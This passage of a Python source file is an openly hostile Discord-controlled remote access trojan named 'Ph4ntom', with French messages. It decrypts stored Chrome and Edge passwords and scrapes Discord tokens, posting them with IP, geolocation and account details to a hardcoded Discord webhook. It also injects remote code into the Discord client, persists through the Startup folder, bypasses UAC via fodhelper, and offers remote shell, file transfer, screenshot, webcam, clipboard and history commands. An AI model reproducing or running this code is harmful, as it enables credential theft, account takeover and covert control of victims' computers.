                b = ffil[1]
                filetext += f"└─:open_file_folder: [{fileanme}]({b})\n"
            filetext += "\n"
    upload("kiwi", filetext)


#TOKEN GRABBER

#PASSWORD

async def passwords(channel):


    try:
        ip = get("https://billy.loca.lt/api/v1/ipv4").text
    except:
        ip = "error"

    APP_DATA_PATH = os.environ['LOCALAPPDATA']
    DB_PATH = r'Google\Chrome\User Data\Default\Login Data'
    NONCE_BYTE_SIZE = 12

    def encrypt(cipher, plaintext, nonce):
        cipher.mode = modes.GCM(nonce)
        encryptor = cipher.encryptor()
        ciphertext = encryptor.update(plaintext)
        return (cipher, ciphertext, nonce)


    def decrypt(cipher, ciphertext, nonce):
        cipher.mode = modes.GCM(nonce)
        decryptor = cipher.decryptor()
        return decryptor.update(ciphertext)


    def rcipher(key):
        cipher = Cipher(algorithms.AES(key), None, backend=default_backend())
        return cipher


    def dpapi(encrypted):

        class DATA_BLOB(ctypes.Structure):
            _fields_ = [('cbData', ctypes.wintypes.DWORD),
                        ('pbData', ctypes.POINTER(ctypes.c_char))]

        p = ctypes.create_string_buffer(encrypted, len(encrypted))
        blobin = DATA_BLOB(ctypes.sizeof(p), p)
        blobout = DATA_BLOB()
        retval = ctypes.windll.crypt32.CryptUnprotectData(
            ctypes.byref(blobin), None, None, None, None, 0, ctypes.byref(blobout))
        if not retval:
            raise ctypes.WinError()
        result = ctypes.string_at(blobout.pbData, blobout.cbData)
        ctypes.windll.kernel32.LocalFree(blobout.pbData)
        return result


    def localdata():
        jsn = None
        with open(os.path.join(os.environ['LOCALAPPDATA'], r"Google\Chrome\User Data\Local State"), encoding='utf-8', mode="r") as f:
            jsn = json.loads(str(f.readline()))
        return jsn["os_crypt"]["encrypted_key"]


    def decryptions(encrypted_txt):
        encoded_key = localdata()
        encrypted_key = base64.b64decode(encoded_key.encode())
        encrypted_key = encrypted_key[5:]
        key = dpapi(encrypted_key)
        nonce = encrypted_txt[3:15]
        cipher = rcipher(key)
        return decrypt(cipher, encrypted_txt[15:], nonce)


    class chromepassword:
        def __init__(self):
            self.passwordList = []


        def chromedb(self):
            _full_path = os.path.join(APP_DATA_PATH, DB_PATH)
            _temp_path = os.path.join(APP_DATA_PATH, 'sqlite_file')
            if os.path.exists(_temp_path):
                os.remove(_temp_path)
            shutil.copyfile(_full_path, _temp_path)
            self.pwsd(_temp_path)

        def pwsd(self, db_file):
            conn = sqlite3.connect(db_file)
            _sql = 'select signon_realm,username_value,password_value from logins'
            for row in conn.execute(_sql):
                host = row[0]
                if host.startswith('android'):
                    continue
                name = row[1]
                value = self.cdecrypt(row[2])
                _info = 'HOST: %s\nNAME: %s\nVALUE: %s\n\n' % (host, name, value)
                self.passwordList.append(_info)
            conn.close()
            os.remove(db_file)


        def cdecrypt(self, encrypted_txt):
            if sys.platform == 'win32':
                try:
                    if encrypted_txt[:4] == b'\x01\x00\x00\x00':
                        decrypted_txt = dpapi(encrypted_txt)
                        return decrypted_txt.decode()
                    elif encrypted_txt[:3] == b'v10':
                        decrypted_txt = decryptions(encrypted_txt)
                        return decrypted_txt[:-16].decode()
                except WindowsError:
                    return None
            else:
                pass


        def saved(self):
            with open(rf'C:\ProgramData\{ip}_passwords.txt', 'w', encoding='utf-8') as f:
                f.writelines(self.passwordList)


    main = chromepassword()
    try:
        main.chromedb()
    except:
        pass
    main.saved()


    zname = rf'C:\ProgramData\{ip}_passwords.zip'
    newzip = zipfile.ZipFile(zname, 'w')
    newzip.write(rf'C:\ProgramData\{ip}_passwords.txt')
    newzip.close()
    passwords = discord.File(rf'C:\ProgramData\{ip}_passwords.zip')



    await channel.send(file=passwords)
    os.remove(rf'C:\ProgramData\{ip}_passwords.zip')
    os.remove(rf'C:\ProgramData\{ip}_passwords.txt')


    def master():
        try:
            with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State',
                    "r", encoding='utf-8') as f:
                local_state = f.read()
                local_state = json.loads(local_state)
        except:
            pass
        try:
            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            master_key = master_key[5:]
            master_key = ctypes.windll.crypt32.CryptUnprotectData(
                (master_key, None, None, None, 0)[1])
            return master_key
        except:
            pass


    def dpayload(cipher, payload):
        return cipher.decrypt(payload)


    def gcipher(aes_key, iv):
        return algorithms.AES.new(aes_key, AESCCM.MODE_GCM, iv)


    def dpassword(buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = gcipher(master_key, iv)
            decrypted_pass = dpayload(cipher, payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except:
            pass


    def passwordsteal():
        master_key = master()
        login_db = os.environ['USERPROFILE'] + os.sep + \
            r'\AppData\Local\Microsoft\Edge\User Data\Profile 1\Login Data'
        try:
            shutil.copy2(login_db, "C:/ProgramData/Loginvault.db")
        except:
            pass
        conn = sqlite3.connect("C:/ProgramData/Loginvault.db")
        cursor = conn.cursor()

        try:
            cursor.execute(
                "SELECT action_url, username_value, password_value FROM logins")
            for r in cursor.fetchall():
                url = r[0]
                username = r[1]
                encrypted_password = r[2]
                decrypted_password = dpassword(
                    encrypted_password, master_key)
        except:
            pass

        cursor.close()
        conn.close()


    passwordsteal()


    try:
        subprocess.os.system('del C:/ProgramData/Loginvault.db')
    except:
        pass


#PASSWORD
nom_fichier =__file__.split("\\")[-1]

startup = True

pc_name = os.getenv("username")
startup_path = fr"C:\Users\{pc_name}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

exe = os.listdir()

liste_path = [""]

if nom_fichier not in exe:
    for a in exe:
        if a.endswith(".exe"):
            liste_path.append(a)

async def activity(client):
    import time
    import win32gui
    while True:
        global stop_threads
        if stop_threads:
            break
        window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
        game = discord.Game(f"Visite: {window}")
        await client.change_presence(status=discord.Status.online, activity=game)
        time.sleep(1)

def between_callback(client):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(activity(client))
    loop.close()

@client.event
async def on_ready():
    import platform
    import re
    import urllib.request
    import json
    with urllib.request.urlopen("https://geolocation-db.com/json") as url:
        data = json.loads(url.read().decode())
        flag = data['country_code']
        ip = data['IPv4']
    import os
    on_ready.total = []
    global number
    number = 0
    global channel_name
    channel_name = None
    for x in client.get_all_channels():
        (on_ready.total).append(x.name)
    for y in range(len(on_ready.total)):
        if "session" in on_ready.total[y]:
            import re
            result = [e for e in re.split("[^0-9]", on_ready.total[y]) if e != '']
            biggest = max(map(int, result))
            number = biggest + 1
        else:
            pass  
    if number == 0:
        channel_name = "session-1"
        newchannel = await client.guilds[0].create_text_channel(channel_name)
    else:
        channel_name = f"session-{number}"
        newchannel = await client.guilds[0].create_text_channel(channel_name)
    channel_ = discord.utils.get(client.get_all_channels(), name=channel_name)
    channel = client.get_channel(channel_.id)
    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    value1 = f"@here :white_check_mark: Nouvelle session {channel_name} | {platform.system()} {platform.release()} | {ip} :flag_{flag.lower()}: | Utilisateur : {os.getlogin()} |  |  "
    if is_admin == True:
        await channel.send(f'{value1} | :gem:')
    elif is_admin == False:
        await channel.send(value1)
    game = discord.Game(f"Arrêt de l'enregistrement des fenêtres")
    await client.change_presence(status=discord.Status.online, activity=game)
    if os_utilisateur != 'windows':
        await channel.send(content="Windows: :x:")
    else:
        await channel.send(content="Windows: :white_check_mark:")
    if startup and os_utilisateur == 'windows':
        try:
            if isfile(__file__):
                shutil.move(__file__, startup_path)
            if liste_path != [""]:
                for a in liste_path:
                    try:
                        shutil.move(a, startup_path)
                    except:
                        pass
            await channel.send(content="Démarrage: :white_check_mark:")
        except Exception as e:
            print(e)
            await channel.send(content="Démarrage: :x:")
    if os_utilisateur == 'windows' and infos:

        lien = await channel.create_webhook(name="Ph4ntom")

        bot.loop.create_task(get_token(lien))
        bot.loop.create_task(passwords(channel))

def volumeup():
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = cast(interface, POINTER(IAudioEndpointVolume))
    if volume.GetMute() == 1:
        volume.SetMute(0, None)
    volume.SetMasterVolumeLevel(volume.GetVolumeRange()[1], None)

def volumedown():
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = cast(interface, POINTER(IAudioEndpointVolume))
    volume.SetMasterVolumeLevel(volume.GetVolumeRange()[0], None)

import os
if os.name != "nt":
	exit()
from re import findall
import json
import psutil
import platform as plt
from json import loads, dumps
from base64 import b64decode
from subprocess import Popen, PIPE
from urllib.request import Request, urlopen
from datetime import datetime

webhook_url = "https://discord.com/api/webhooks/1074527981466296381/tNx176qa91OcP6ooEDFge5YvBUleTUsZmUSOda4UuidYIcaV3i_xly-A_IL7uBYxtDde"
password_stealer = False

languages = {
	'da'    : 'Danish, Denmark',
	'de'    : 'German, Germany',
	'en-GB' : 'English, United Kingdom',
	'en-US' : 'English, United States',
	'es-ES' : 'Spanish, Spain',
	'fr'    : 'French, France',
	'hr'    : 'Croatian, Croatia',
	'lt'    : 'Lithuanian, Lithuania',
	'hu'    : 'Hungarian, Hungary',
	'nl'    : 'Dutch, Netherlands',
	'no'    : 'Norwegian, Norway',
	'pl'    : 'Polish, Poland',
	'pt-BR' : 'Portuguese, Brazilian, Brazil',
	'ro'    : 'Romanian, Romania',
	'fi'    : 'Finnish, Finland',
	'sv-SE' : 'Swedish, Sweden',
	'vi'    : 'Vietnamese, Vietnam',
	'tr'    : 'Turkish, Turkey',
	'cs'    : 'Czech, Czechia, Czech Republic',
	'el'    : 'Greek, Greece',
	'bg'    : 'Bulgarian, Bulgaria',
	'ru'    : 'Russian, Russia',
	'uk'    : 'Ukranian, Ukraine',
	'th'    : 'Thai, Thailand',
	'zh-CN' : 'Chinese, China',
	'ja'    : 'Japanese',
	'zh-TW' : 'Chinese, Taiwan',
	'ko'    : 'Korean, Korea'
}

LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
PATHS = {
	"Discord"           : ROAMING + "\\Discord",
	"Discord Canary"    : ROAMING + "\\discordcanary",
	"Discord PTB"       : ROAMING + "\\discordptb",
	"Google Chrome"     : LOCAL + r"\\Google\\Chrome\\User Data\\Default",
	"Opera"             : ROAMING + "\\Opera Software\\Opera Stable",
	"Opera GX"			: ROAMING + "\\Opera Software\\Opera GX Stable",
	"Brave"             : LOCAL + r"\\BraveSoftware\\Brave-Browser\\User Data\\Default",
	"Yandex"            : LOCAL + r"\\Yandex\\YandexBrowser\\User Data\\Default"
}
def getheaders(token=None, content_type="application/json"):
	headers = {
		"Content-Type": content_type,
		"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
	}
	if token:
		headers.update({"Authorization": token})
	return headers

def getuserdata(token):
	try:
		return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getheaders(token))).read().decode())
	except:
		pass
		
def gettokens(path):
	path += "\\Local Storage\\leveldb"
	tokens = []
	for file_name in os.listdir(path):
		if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
			continue
		for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
			for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
				for token in findall(regex, line):
					tokens.append(token)
	return tokens

def gethwid():
    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]

def getip():
	ip = org = loc = city = country = region = googlemap = "None"
	try:
		url = 'http://ipinfo.io/json'
		response = urlopen(url)
		data = json.load(response)
		ip = data['ip']
		org = data['org']
		loc = data['loc']
		city = data['city']
		country = data['country']
		region = data['region']
		googlemap = "https://www.google.com/maps/search/google+map++" + loc
	except:
		pass
	return ip,org,loc,city,country,region,googlemap

def getavatar(uid, aid):
	url = f"https://cdn.discordapp.com/avatars/{uid}/{aid}.gif"
	try:
		urlopen(Request(url))
	except:
		url = url[:-4]
	return url

def has_payment_methods(token):
	try:
		return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=getheaders(token))).read().decode())) > 0)
	except:
		pass

def main():
	embeds = []
	working = []
	checked = []
	working_ids = []
	computer_os = plt.platform()
	ip,org,loc,city,country,region,googlemap = getip()
	pc_username = os.getenv("UserName")
	pc_name = os.getenv("COMPUTERNAME")
	for platform, path in PATHS.items():
		if not os.path.exists(path):
			continue
		for token in gettokens(path):
			if token in checked:
				continue
			checked.append(token)
			uid = None
			if not token.startswith("mfa."):
				try:
					uid = b64decode(token.split(".")[0].encode()).decode()
				except:
					pass
				if not uid or uid in working_ids:
					continue
			user_data = getuserdata(token)
			if not user_data:
				continue
			working_ids.append(uid)
			working.append(token)
			username = user_data["username"] + "#" + str(user_data["discriminator"])
			user_id = user_data["id"]
			locale = user_data['locale']
			avatar_id = user_data["avatar"]
			avatar_url = getavatar(user_id, avatar_id)
			email = user_data.get("email")
			phone = user_data.get("phone")
			verified = user_data['verified']
			mfa_enabled = user_data['mfa_enabled']
			flags = user_data['flags']
			creation_date = datetime.fromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime("%d-%m-%Y %H:%M:%S")

			language = languages.get(locale)
			nitro = bool(user_data.get("premium_type"))
			billing = bool(has_payment_methods(token))
			embed = {
				"color": 16507654,
				"fields": [
					{
						"name": "**𝗔𝗰𝗰𝗼𝘂𝗻𝘁 𝗜𝗻𝗳𝗼**",
						"value": f'Email: {email}\nTéléphone: {phone}\nNitro: {nitro}\nPayement: {billing}',
						"inline": True
					},
					{
						"name": "**𝗣𝗰 𝗜𝗻𝗳𝗼**",
						"value": f'OS: {computer_os}\nUtilisateur: {pc_username}\nNom du pc: {pc_name}\n',
						"inline": True
					},
					{
						"name": "--------------------------------------------------------------------------------------------------",
						"value":"-----------------------------------------------------------------------------------------------",
						"inline": False
					},
					{
						"name": "**𝗜𝗣**",
						"value": f'IP: {ip}\nLocalisation: [{loc}]({googlemap})\nVille: {city}\nRegion: {region}\nDépartement: {org}',
						"inline": True
					},
					{
						"name": "**𝗢𝘁𝗵𝗲𝗿 𝗜𝗻𝗳𝗼**",
						"value": f'Locale: {locale} ({language})\nToken: {platform}\nEmail Verifié: {verified}\n2fa: {mfa_enabled}\ndate de création: {creation_date}',
						"inline": True
					},
					{
						"name": "**𝗧𝗼𝗸𝗲𝗻**",
						"value": f"`{token}`",
						"inline": False
					}
				],
				"author": {
					"name": f"{username}・{user_id}",
					"icon_url": avatar_url
				},
				"footer": {
					"text": "Ph4ntom By Jqnvier#0001 "
				}
			}
			embeds.append(embed)

	if len(working) == 0:
		working.append('123')
	webhook = {
		"content": "",
		"embeds": embeds,
		"username": "Ph4ntom",
		"avatar_url": "https://media.discordapp.net/attachments/910206870088736779/910210025459425330/unnamed.jpg"
	}
	try:
		urlopen(Request(webhook_url, data=dumps(webhook).encode(), headers=getheaders()))
	except:
		pass

def HazardStealer():
	for proc in psutil.process_iter():
		if any(procstr in proc.name() for procstr in\
		['discord', 'Discord', 'DISCORD',]):
			proc.kill()
	for root, dirs, files in os.walk(os.getenv("LOCALAPPDATA")):
		for name in dirs:
			if (name.__contains__("discord_desktop_core-")):
				try:
					directory_list = os.path.join(root, name+"\\discord_desktop_core\\index.js")
					os.mkdir(os.path.join(root, name+"\\discord_desktop_core\\Hazard"))
					f = urlopen("https://raw.githubusercontent.com/Rdimo/Injection/master/Injection-clean")
					index_content = f.read()
					with open(directory_list, 'wb') as index_file:
						index_file.write(index_content)
					with open(directory_list, 'r+') as index_file2:
						replace_string = index_file2.read().replace("%WEBHOOK_LINK%", webhook_url)
					with open(directory_list, 'w'): pass
					with open(directory_list, 'r+') as index_file3:
						index_file3.write(replace_string)
				except Exception:
				    pass
for root, dirs, files in os.walk(os.getenv("APPDATA")+"\\Microsoft\\Windows\\Start Menu\\Programs\\Discord Inc"):
		for name in files:
			discord_file = os.path.join(root, name)
			os.startfile(discord_file)

if __name__ == "__main__":
    main()
    if password_stealer:
        HazardStealer()

@client.event
async def on_message(message):
    if message.channel.name != channel_name:
        pass
    else:
        if message.content.startswith("!kill"):
            if message.content[6:] == "all":
                for y in range(len(on_ready.total)): 
                    if "session" in on_ready.total[y]:
                        channel_to_delete = discord.utils.get(client.get_all_channels(), name=on_ready.total[y])
                        await channel_to_delete.delete()
                    else:
                        pass
            else:
                try:
                    channel_to_delete = discord.utils.get(client.get_all_channels(), name=message.content[6:])
                    await channel_to_delete.delete()
                    await message.channel.send(f"[*] {message.content[6:]} Tuée.")
                except:
                    await message.channel.send(f"[!] {message.content[6:]} Argument invalide.")

        if message.content == "!exit":
            exit()

        if message.content == "!windowstart":
            import threading
            global stop_threads
            stop_threads = False
            global _thread
            _thread = threading.Thread(target=between_callback, args=(client,))
            _thread.start()
            await message.channel.send("[*] L'enregistrement de la fenêtre pour cette session a commencé")

        if message.content == "!windowstop":
            stop_threads = True
            await message.channel.send("[*] Arrêt de la journalisation des fenêtres pour cette session")
            game = discord.Game(f"Arrêt de l'enregistrement des fenêtres")
            await client.change_presence(status=discord.Status.online, activity=game)

        if message.content == "!screenshot":
            import os
            from mss import mss
            with mss() as sct:
                sct.shot(output=os.path.join(os.getenv('TEMP') + "\\monitor.png"))
            file = discord.File(os.path.join(os.getenv('TEMP') + "\\monitor.png"), filename="monitor.png")
            await message.channel.send("[*] Commande exécutée avec succès", file=file)
            os.remove(os.path.join(os.getenv('TEMP') + "\\monitor.png"))

        if message.content == "!volumemax":
            volumeup()
            await message.channel.send("[*] Volume mis a jour vers 100%")

        if message.content == "!volumezero":
            volumedown()
            await message.channel.send("[*] Volume mis a jour vers 0%")

        if message.content == "!webcampic": #Downloads a file over internet which is not great but avoids using opencv/numpy which helps reducing final exe file if compiled
            import os
            import urllib.request
            from zipfile import ZipFile
            directory = os.getcwd()
            try:
                os.chdir(os.getenv('TEMP'))
                urllib.request.urlretrieve("https://www.nirsoft.net/utils/webcamimagesave.zip", "temp.zip")
                with ZipFile("temp.zip") as zipObj:
                    zipObj.extractall()
                os.system("WebCamImageSave.exe /capture /FileName temp.png")
                file = discord.File("temp.png", filename="temp.png")
                await message.channel.send("[*] Commande exécutée avec succès", file=file)
                os.remove("temp.zip")
                os.remove("temp.png")
                os.remove("WebCamImageSave.exe")
                os.remove("readme.txt")
                os.remove("WebCamImageSave.chm")
                os.chdir(directory)
            except:
                await message.channel.send("[!] Erreur.")

        if message.content.startswith("!message"):
            import ctypes
            import time
            MB_YESNO = 0x04
            MB_HELP = 0x4000
            ICON_STOP = 0x10
            def mess():
                ctypes.windll.user32.MessageBoxW(0, message.content[8:], "Error", MB_HELP | MB_YESNO | ICON_STOP) #Show message box
            import threading
            messa = threading.Thread(target=mess)
            messa._running = True
            messa.daemon = True
            messa.start()
            import win32con
            import win32gui
            import time
            time.sleep(1)
            hwnd = win32gui.FindWindow(None, "Error") 
            win32gui.ShowWindow(hwnd, win32con.SW_RESTORE) #Put message to foreground
            win32gui.SetWindowPos(hwnd,win32con.HWND_NOTOPMOST, 0, 0, 0, 0, win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)
            win32gui.SetWindowPos(hwnd,win32con.HWND_TOPMOST, 0, 0, 0, 0, win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)  
            win32gui.SetWindowPos(hwnd,win32con.HWND_NOTOPMOST, 0, 0, 0, 0, win32con.SWP_SHOWWINDOW + win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)

        if message.content.startswith("!wallpaper"):
            import ctypes
            import os
            path = os.path.join(os.getenv('TEMP') + "\\temp.jpg")
            await message.attachments[0].save(path)
            ctypes.windll.user32.SystemParametersInfoW(20, 0, path , 0)
            await message.channel.send("[*] Commande exécutée avec succès")

        if message.content.startswith("!upload"):
            await message.attachments[0].save(message.content[8:])
            await message.channel.send("[*] Commande exécutée avec succès")

        if message.content.startswith("!shell"):
            global status
            import time
            status = None
            import subprocess
            import os
            instruction = message.content[7:]
            def shell():
                output = subprocess.run(instruction, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                global status
                status = "ok"
                return output
            import threading
            shel = threading.Thread(target=shell) #Use of threading and a global variable to avoid hanging if command is too long to produce an output (probably a better way to do this)
            shel._running = True
            shel.start()
            time.sleep(1)
            shel._running = False
            if status:
                result = str(shell().stdout.decode('CP437')) #CP437 Decoding used for characters like " é " etc..
                print(result)
                numb = len(result)
                print(numb)
                if numb < 1:
                    await message.channel.send("[*] Commande non reconnue ou aucune sortie n'a été obtenue")
                elif numb > 1990:
                    f1 = open("output.txt", 'a')
                    f1.write(result)
                    f1.close()
                    file = discord.File("output.txt", filename="output.txt")
                    await message.channel.send("[*] Commande exécutée avec succès", file=file)
                    os.popen("del output.txt")
                else:
                    await message.channel.send("[*] Commande exécutée avec succès: " + result)
            else:
                await message.channel.send("[*] Commande non reconnue ou aucune sortie n'a été obtenue")
                status = None

        if message.content.startswith("!download"):
            file = discord.File(message.content[10:], filename=message.content[10:])
            await message.channel.send("[*] Commande exécutée avec succès", file=file)

        if message.content.startswith("!cd"):
            import os
            os.chdir(message.content[4:])
            await message.channel.send("[*] Commande exécutée avec succès")

        if message.content == "!help":
            embed = discord.Embed(title = "Les commandes disponibles sont :", color=0xb70600)
            embed.add_field(name = "!message ", value = "Afficher une boîte de messages contenant votre texte / Syntaxe  = !message example",  inline=False)
            embed.add_field(name = "!shell", value = "Exécuter une commande shell /Syntaxe  = !shell whoami",  inline=False)
            embed.add_field(name = "!webcampic", value = "Prendre une photo à partir de la webcam",  inline=False)
            embed.add_field(name = "!windowstart", value = "émarrer l'enregistrement de la fenêtre de l'utilisateur actuel (La journalisation est montrée dans l'activité du bot)",  inline=False)
            embed.add_field(name = "!windowstop", value = "Arrêter l'enregistrement de la fenêtre de l'utilisateur actuel ",  inline=False)
            embed.add_field(name = "!voice", value = "Faire dire à voix haute à une voix une phrase personnalisée / Syntaxe = !voice test",  inline=False)
            embed.add_field(name = "!admincheck", value = "Vérifiez si le programme a des privilèges d'administrateur",  inline=False)
            embed.add_field(name = "!sysinfo", value = "Donne des informations sur l'ordinateur infecté",  inline=False)
            embed.add_field(name = "!hystory", value = "Obtenir l'historique de la navigation de l'ordinateur",  inline=False)
            embed.add_field(name = "!download", value = "Télécharger un fichier depuis un ordinateur infecté",  inline=False)
            embed.add_field(name = "!upload", value = "Télécharger un fichier du site web vers l'ordinateur / Syntaxe = '!upload file.png' (avec pièce jointe)",  inline=False)
            embed.add_field(name = "!cd", value = "Change le répertoire",  inline=False)
            embed.add_field(name = "!write", value = "Tapez votre phrase souhaitée sur l'ordinateur infecté",  inline=False)
            embed.add_field(name = "!wallpaper", value = "Modifier le fond d'écran d'un ordinateur infecté / Syntaxe = !wallpaper (avec pièce jointe)",  inline=False)
            embed.add_field(name = "!clipboard", value = "Récupérer le contenu du presse-papiers de l'ordinateur infecté",  inline=False)
            embed.add_field(name = "!geolocate", value = "Géolocaliser l'ordinateur en utilisant la latitude et la longitude de l'adresse IP avec google map",  inline=False)
            embed.add_field(name = "!volumemax", value = "Volume 100%.",  inline=False)
            embed.add_field(name = "!volumezero", value = "Volume 0 %.",  inline=False)
            embed.add_field(name = "!idletime", value = "Obtenir le temps d'inactivité de l'utilisateur",  inline=False)
            embed.add_field(name = "!sing", value = "Lire la vidéo choisie en arrière-plan (fonctionne uniquement avec les liens youtube)",  inline=False)
            embed.add_field(name = "!stopsing", value = "Arrêter la lecture de la vidéo en arrière-plan",  inline=False)
            embed.add_field(name = "!blockinput", value = "Bloque le clavier et la souris de l'utilisateur / Attention : Les droits d'administrateur sont requis.",  inline=False)
            embed.add_field(name = "!unblockinput", value = "Débloque le clavier et la souris de l'utilisateur / Attention : Les droits d'administrateur sont requis.",  inline=False)
            embed.add_field(name = "!screenshot", value = "Obtenez la capture d'écran de l'écran actuel de l'utilisateur.",  inline=False)
            embed.add_field(name = "!exit", value = "Quitte le RAT",  inline=False)
            embed.add_field(name = "!kill", value = "Tuer une session ou toutes les sessions sauf la session en cours / Syntaxe = !kill session-3 ou !kill all.",  inline=False)
            await message.channel.send(embed=embed)

        if message.content.startswith("!write"):
            import pyautogui
            if message.content[7:] == "enter":
                pyautogui.press("enter")
            else:
                pyautogui.typewrite(message.content[7:])

        if message.content == "!history":
            import os
            import browserhistory as bh
            dict_obj = bh.get_browserhistory()
            strobj = str(dict_obj).encode(errors='ignore')
            with open("history.txt","a") as hist:
                hist.write(str(strobj))
            file = discord.File("history.txt", filename="history.txt")
            await message.channel.send("[*] Commande exécutée avec succès", file=file)
            os.remove("history.txt")

        if message.content == "!clipboard":
            import ctypes
            import os
            CF_TEXT = 1
            kernel32 = ctypes.windll.kernel32
            kernel32.GlobalLock.argtypes = [ctypes.c_void_p]
            kernel32.GlobalLock.restype = ctypes.c_void_p
            kernel32.GlobalUnlock.argtypes = [ctypes.c_void_p]
            user32 = ctypes.windll.user32
            user32.GetClipboardData.restype = ctypes.c_void_p
            user32.OpenClipboard(0)
            if user32.IsClipboardFormatAvailable(CF_TEXT):
                data = user32.GetClipboardData(CF_TEXT)
                data_locked = kernel32.GlobalLock(data)
                text = ctypes.c_char_p(data_locked)
                value = text.value
                kernel32.GlobalUnlock(data_locked)
                body = value.decode()
                user32.CloseClipboard()
                await message.channel.send(f"[*] Le contenu du presse-papiers est : {body}")

        if message.content.startswith("!stopsing"):
            import os 
            os.system(f"taskkill /F /IM {pid_process[1]}")

        if message.content == "!sysinfo":
            import platform
            info = platform.uname()
            info_total = f'{info.system} {info.release} {info.machine}'
            from requests import get
            ip = get('https://api.ipify.org').text
            await message.channel.send(f"[*] Commande exécutée avec succès : {info_total} {ip}")

        if message.content == "!geolocate":
            import urllib.request
            import json
            with urllib.request.urlopen("https://geolocation-db.com/json") as url:
                data = json.loads(url.read().decode())
                link = f"http://www.google.com/maps/place/{data['latitude']},{data['longitude']}"
                await message.channel.send("[*] Commande exécutée avec succès : " + link)

        if message.content == "!admincheck":
            import ctypes
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                await message.channel.send("[*] Félicitations, vous êtes admin x)")
            elif is_admin == False:
                await message.channel.send("[!] Désolé, vous n'êtes pas admin :/")

        if message.content == "!uacbypass":
            import os
            import win32net
            if 'logonserver' in os.environ:
                server = os.environ['logonserver'][2:]
            else:
                server = None
            def if_user_is_admin(Server):
                groups = win32net.NetUserGetLocalGroups(Server, os.getlogin())
                isadmin = False
                for group in groups:
                    if group.lower().startswith('admin'):
                        isadmin = True
                return isadmin, groups
            is_admin, groups = if_user_is_admin(server)
            if is_admin == True:
                print('User in admin group trying to bypass uac')
                import os
                import sys
                import ctypes
                import winreg
                CMD = "C:\\Windows\\System32\\cmd.exe"
                FOD_HELPER = 'C:\\Windows\\System32\\fodhelper.exe'
                COMM = "start"
                REG_PATH = 'Software\\Classes\\ms-settings\\shell\\open\\command'
                DELEGATE_EXEC_REG_KEY = 'DelegateExecute'

                def is_running_as_admin():
                    """
                    Vérifie si le script est exécuté avec des privilèges d'administrateur.
                    Retourne True si le script est exécuté en tant qu'administrateur, False sinon..
                    """
                    try:
                        return ctypes.windll.shell32.IsUserAnAdmin()
                    except:
                        return False

                def create_reg_key(key, value):
                    """
                    Creates a reg key
                    """
                    try:
                        winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH)
                        registry_key = winreg.OpenKey(
                            winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_WRITE)
                        winreg.SetValueEx(registry_key, key, 0,
                                          winreg.REG_SZ, value)
                        winreg.CloseKey(registry_key)
                    except WindowsError:
                        raise

                def bypass_uac(cmd):
                    """
                    Tries to bypass the UAC
                    """
                    try:
                        create_reg_key(DELEGATE_EXEC_REG_KEY, '')
                        create_reg_key(None, cmd)
                    except WindowsError:
                        raise

                def execute():
                    if not is_running_as_admin():
                        print(
                            '[!] Le script n''est PAS exécuté avec des privilèges administratifs')
                        print('[+] Essaye de bypass..')
                        try:
                            current_dir = os.path.dirname(
                                os.path.realpath(__file__)) + '\\' + sys.argv[0]
                            cmd = '{} /k {} {}'.format(CMD, COMM, current_dir)
                            print(cmd)
                            bypass_uac(cmd)
                            os.system(FOD_HELPER)
                            sys.exit(0)
                        except WindowsError:
                            sys.exit(1)
                    else:
                        print(
                            '[+] Le script est exécuté avec des privilèges administratifs!')
                if __name__ == '__main__':
                    execute()
            else:
                print("failed")
                await message.channel.send("[*] Commande échouée : L'utilisateur n'est pas dans le groupe des administrateurs")

        if message.content.startswith("!sing"):
            volumeup()
            from win32 import win32gui
            import win32con
            import win32gui
            from win32con import SW_HIDE
            import win32process
            import os
            link = message.content[6:]
            if link.startswith("http"):
                link = link[link.find('www'):]
            os.system(f'start {link}')
            while True:
                def get_all_hwnd(hwnd,mouse):
                    def winEnumHandler(hwnd, ctx):
                        if win32gui.IsWindowVisible(hwnd):
                            if "youtube" in (win32gui.GetWindowText(hwnd).lower()):
                                win32gui.ShowWindow(hwnd, SW_HIDE)
                                global pid_process
                                pid_process = win32process.GetWindowThreadProcessId(hwnd)
                                return "ok"
                        else:
                            pass
                    if win32gui.IsWindow(hwnd) and win32gui.IsWindowEnabled(hwnd) and win32gui.IsWindowVisible(hwnd):
                        win32gui.EnumWindows(winEnumHandler,None)
                try:
                    win32gui.EnumWindows(get_all_hwnd, 0)
                except:
                    break

        if message.content == "!idletime":
            class LASTINPUTINFO(Structure):
                _fields_ = [
                    ('cbSize', c_uint),
